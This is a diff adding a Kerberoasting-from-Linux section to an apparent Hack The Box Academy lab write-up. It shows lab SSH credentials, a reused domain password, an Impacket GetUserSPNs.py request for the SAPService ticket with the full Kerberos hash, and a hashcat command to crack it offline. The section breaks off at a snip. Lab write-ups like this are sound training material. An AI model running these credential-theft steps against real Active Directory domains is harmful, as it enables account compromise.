@@ -564,3 +564,41 @@ This command does the following:
 dsquery user -disabled -desc *: Searches for all disabled user accounts and includes the description field.
 
 dsget user -samid -desc: Retrieves the SAM account name and description of the found accounts.
+
+
+## Kerberoasting - from Linux
+
+> SSH to 10.129.24.162 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+* **Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.**
+
+I started by connecting to the target machine at 10.129.24.162 via SSH, using the provided credentials. Once connected, I ran GetUserSPNs.py:
+
+```c
+┌─[htb-student@ea-attack01]─[~]
+└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/wley -request-user SAPService
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
+------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
+SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>               
+
+
+
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$a6ce0a3dc1febb42bd95c9ffea0c179e$0a9f6efda6b3a548ac50e2148dcd0d83d163ad71283bdd5a9d448a4c03cc9fc0c2991d225cb9aebc209c717df7165caa10164becf7f2dc45bd656d68fd005896cc0e0f4d0de2bb4bad5e86fbdad23825d127d1fc692323eb79868795e114dadb60fc37e9bda61d3198d568ad9c2bda595a705cee9000cd244bf080a070ed0c315f1efd52c8bfc9cd265d14f5a8099d89e0f3d2c8ffa184eb92f248f274807fa03ee94b47ba1db4bf7c8675384695ebeddd6ed8f47d69a831bf8ff0857bc2ccfedaf27c1f864eb17b4496d0cc5d63a76c72cd37bb53386500851a23d0445a96f8e58ca63b23ca1bc659490069ddaa020de0e98daa12713e992d94586d9fb2452f5bea520e92d8109c5c91a6b5dbafee46b5809505696d35523c8981dadf476a5faa268fb342663799f4a8fc98d90ad0245c5be7be9b4dc5f82af4f3609daa87324b8c3e6c5917fecad2c77c3e26eb99402caac457e7b5fc2de58ff4732acc92175cda31f86bd2a407c20686f1d8a55bd445ec5cac22dbc77e0a35385214d325d02f674dd37a5f8bba751db417ca410052dac3ab1b61f2acae05f6f73b1451f075d58a48bbcaeb350f2fe240b5f45cec82b13081ef17022e01777de486b6c986cc02c0843bc2300eb01a6eaa2a6fef887aa7b41c775544e378cc1950149bbc3691eb4fffd440c33bc1c48ea93ba95e10faf340b8a55b94c42548cb95536b84cd447d476c96e3b502ed8646711615e7234efc4b2ff41fe8281955c247e22281313557a502c4287c60d14e13187970402e32250efb0aad8c0ac3bb87544dcc269db67abb371cac8a29732bcd66e3cfd8f7887cf4fd45c24d8caf782ec7ffe0bdca6a459b9acafc4f4d5ef5557c712716f08bd99cda4706bce50d00064e36ef67e51c2d985c3db9a5a9d7611b5c9ab7f26ae8ebd94c78df08bd69aebc2ce08cdda97d4152d7a2edc2a08a887c0ae8454121f02bf4c2498269500504a6c132cc1381ef990d38d8f49b3921bdb3cdf83c3675e6b5770678f737b308c4c722bddf5e69f02b6f588981138d54cc5755d2fc4c1d4c1bc9ff556a20cc035ae818b4168dcbdcdbb59ae20dc1342d6a51711d6e3d6548e3f23e60beb4b8dd6b0c6c7220537f2c035b891b14db96551251762003041c74ce98b020379c8e29a5cfc40b96f8da7f444d19e9f9a3b29c2ca6b98b6038378a2cbedda527a29fa9d8d455b6ed628ade91d6f7e39088a076972b3428e078f758575798e1cc5d47659a0c9b7c1b9f7dd73764ccf486691dfd0b682037c3738a2f33540481443352bcbe29b413141e2ecf6ba568a4d0a81836840ffef80abca6b876deb4d2164486337694cf30bc10b33491070fc4b38edbe34cf4384426a19852514c625716e45c9ffff96bac8e3cd1c5dcc586bea883f87b06494b831edb92d510b3f756c7ff372ac0675e46f2d6662c54388d58ffb1166f
+```
+> I ran this command with the user wley and the password transporter@4 which we discovered on previous sections.
+
+Once I got the TGS ticket, I copied it to the attack host and used hashcat to crack the ticket:
+
+```c
+hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt
+```
+
+[![Screenshot-2025-03-18-111408.png](https://i.postimg.cc/nc7LGWF3/Screenshot-2025-03-18-111408.png)](https://postimg.cc/w7qH60sN)
+
+<snip>
+
+```
+
